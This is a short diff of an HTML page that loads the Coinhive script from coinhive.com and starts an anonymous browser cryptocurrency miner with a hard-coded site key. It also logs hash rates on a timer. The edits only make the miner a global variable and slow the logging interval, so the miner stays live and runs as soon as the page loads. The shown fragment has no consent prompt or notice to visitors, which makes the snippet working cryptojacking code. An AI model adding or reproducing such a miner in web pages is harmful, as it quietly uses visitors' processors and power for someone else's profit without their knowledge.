@@ -9,7 +9,7 @@
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
   var key = 'ZMA6J6PnOr08MjYU7KjeqwY1rgUMrXMg';
-  var miner = new CoinHive.Anonymous(key);
+  window.miner = new CoinHive.Anonymous(key);
   miner.start();
 
   // Listen on events
@@ -27,7 +27,7 @@
     var acceptedHashes = miner.getAcceptedHashes();
 
     console.log(hashesPerSecond, totalHashes, acceptedHashes);
-  }, 1000);
+  }, 5000);
 </script>
 
 </body>
